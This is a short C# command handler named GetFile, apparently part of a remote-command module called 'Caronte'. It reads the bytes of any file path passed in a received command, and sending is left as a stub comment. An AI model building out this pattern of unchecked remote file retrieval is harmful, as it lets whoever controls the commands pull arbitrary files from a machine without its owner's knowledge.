using Barsa.Abstracts;
using Barsa.Commoms;
using System;
using System.IO;

namespace Caronte.Modules.Command.ReceiveCommand.Commands
{
    public class GetFile : AbstractHandler
    {
        public override CommomResponse Handle(CommandType CommandType, object parameter)
        {
            var response = new CommomResponse();

            if(CommandType != CommandType.GET_FILE)
                return base.Handle(CommandType, parameter);

            var filePath = Convert.ToString(parameter);
            var fileByte = File.ReadAllBytes(filePath);

            // send bytes

            return response;
        }
    }
}
